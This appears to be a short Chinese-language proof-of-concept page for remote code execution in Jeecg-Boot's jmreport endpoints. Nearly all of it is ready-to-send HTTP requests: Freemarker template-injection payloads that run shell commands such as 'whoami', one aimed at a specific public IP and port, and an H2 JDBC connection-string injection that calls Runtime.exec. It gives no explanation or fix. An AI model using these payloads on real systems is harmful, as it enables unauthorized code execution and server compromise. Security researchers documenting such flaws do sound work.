# Jeecg-Boot Freemarker 模板注入 RCE 漏洞

    ```
POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1
Host: ip:port
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36

{"sql":"<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"命令\")}"}
```

![image](https://s1.ax1x.com/2023/08/17/pPlXhSU.jpg)

```
{"sql":"select '<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"UTF-8\"><#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"ping baidu.com\")}<title>Hello!</title><link href=\"/css/main.css\" rel=\"stylesheet\"></head><body><h2 class=\"hello-title\">Hello!</h2><script src=\"/js/main.js\"></script></body></html>'"}
```

```
POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1
Host: 47.115.200.176:9005
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/json
Accept-Encoding: gzip
Content-Length: 100

{"sql":"select '<#assign value=\"freemarker.template.utility.Execute\"?new()>${value(\"whoami\")}'"}
```



## h2

```
POST /jeecg-boot/jmreport/testConnection HTTP/1.1
Host: 192.168.90.1:3100
Content-Length: 367
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin: http://192.168.90.1:3100
Referer: http://192.168.90.1:3100/login?redirect=/dashboard/analysis
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{
  "id": "1",
  "code": "dataSource1",
  "dbType": "H2",
  "dbDriver": "org.h2.Driver",
  "dbUrl": "jdbc:h2:mem:test;init=CREATE TRIGGER shell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\u000A\u0009java.lang.Runtime.getRuntime().exec('whoami')\u000A$$",
  "dbName": "test",
  "dbUsername": "sa",
  "dbPassword": "",
  "connectTimes": 5
}
```

https://c0olw.github.io/2023/08/15/JeecgBoot-SSTI%E4%BB%A5%E5%8F%8AJDBC-RCE/
